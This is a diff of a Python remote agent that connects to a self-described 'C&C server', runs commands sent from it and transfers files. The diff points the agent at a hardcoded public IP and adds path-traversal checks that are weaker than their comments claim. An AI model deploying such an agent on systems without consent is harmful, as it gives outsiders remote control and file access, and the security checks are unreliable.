@@ -16,7 +16,7 @@ import base64
 from io import BytesIO
 
 # Configuration - Server IP will be auto-detected or read from config
-SERVER_URL = "http://127.0.0.1:5000"  # Change to your C&C server IP (localhost for testing)
+SERVER_URL = "http://102.209.236.22:5000"  # Auto-configured with your public IP
 AGENT_ID = None
 
 # Auto-detect server URL from environment or local config
@@ -122,7 +122,7 @@ class RemoteAgent:
                 
                 output = {
                     'command_id': command_id,
-                    'output': result.stdout + result.stderr,
+                    'output': (result.stdout or '') + (result.stderr or ''),
                     'return_code': result.returncode,
                     'timestamp': datetime.now().isoformat()
                 }
@@ -145,16 +145,28 @@ class RemoteAgent:
                     'timestamp': datetime.now().isoformat()
                 }
                 self.sio.emit('command_result', output)
-    
+        
         @self.sio.event
         def list_files(data):
             """List files in directory"""
             path = data.get('path', '.')
-            print(f"[AGENT] Listing files: {path}")
+            # Validate path to prevent directory traversal
+            if '..' in path or path.startswith('/') or ':' in path:
+                self.sio.emit('file_list', {
+                    'path': path,
+                    'error': 'Invalid path: directory traversal not allowed',
+                    'command_id': data.get('command_id')
+                })
+                return
+            # Resolve to safe path within agent's allowed directory
+            safe_path_resolved = os.path.abspath(path)
+            print(f"[AGENT] Listing files: {safe_path_resolved}")
             
             try:
                 entries = []
-                for item in sorted(os.listdir(path)):
+                if not os.path.exists(safe_path_resolved):
+                    raise FileNotFoundError(f"Path does not exist: {safe_path_resolved}")
+                for item in sorted(os.listdir(safe_path_resolved)):
                     full_path = os.path.join(path, item)
                     try:
                         stat = os.stat(full_path)
@@ -190,8 +202,14 @@ class RemoteAgent:
             print(f"[AGENT] Uploading file: {filename} to {remote_path}")
             
             try:
+                # Validate path to prevent directory traversal
+                if '..' in remote_path or '..' in filename or ':' in remote_path:
+                    raise ValueError("Invalid path: directory traversal not allowed")
+                
                 file_data = base64.b64decode(content_b64)
-                full_path = os.path.join(remote_path, filename)
+                # Sanitize filename - remove any path separators
+                safe_filename = os.path.basename(filename)
+                full_path = os.path.abspath(os.path.join(remote_path, safe_filename))
                 
                 with open(full_path, 'wb') as f:
                     f.write(file_data)
@@ -217,7 +235,12 @@ class RemoteAgent:
             print(f"[AGENT] Downloading file: {file_path}")
             
             try:
-                with open(file_path, 'rb') as f:
+                # Validate path to prevent directory traversal
+                if '..' in file_path or file_path.startswith('/') or ':' in file_path:
+                    raise ValueError("Invalid path: directory traversal not allowed")
+                safe_file_path = os.path.abspath(file_path)
+                
+                with open(safe_file_path, 'rb') as f:
                     content = f.read()
                 
                 content_b64 = base64.b64encode(content).decode('utf-8')
@@ -357,8 +380,8 @@ class RemoteAgent:
                         processes.append({
                             'pid': proc.ProcessId,
                             'name': proc.Name,
-                            'cpu': getattr(proc, 'ProcessId', 0),
-                            'memory': 0
+                            'cpu': 0,  # WMI CPU requires separate query
+                            'memory': getattr(proc, 'WorkingSetSize', 0) // 1024 // 1024  # MB
                         })
                 else:
                     result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
@@ -415,14 +438,15 @@ class RemoteAgent:
             print(f"[AGENT] Sending WoL to: {mac_address}")
             
             try:
-                import socket
                 # Parse MAC address
                 mac = mac_address.replace(':', '').replace('-', '')
                 if len(mac) != 12:
                     raise ValueError("Invalid MAC address format")
                 
-                # Create magic packet
-                packet = bytes.fromhex('F' * 12 + mac * 16)
+                # Create magic packet: 6 bytes of 0xFF followed by 16 repetitions of MAC address
+                # 'FF' repeated 6 times = 12 hex chars for sync stream
+                # MAC address repeated 16 times for target
+                packet = bytes.fromhex('FF' * 6 + mac * 16)
                 
                 # Send packet
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
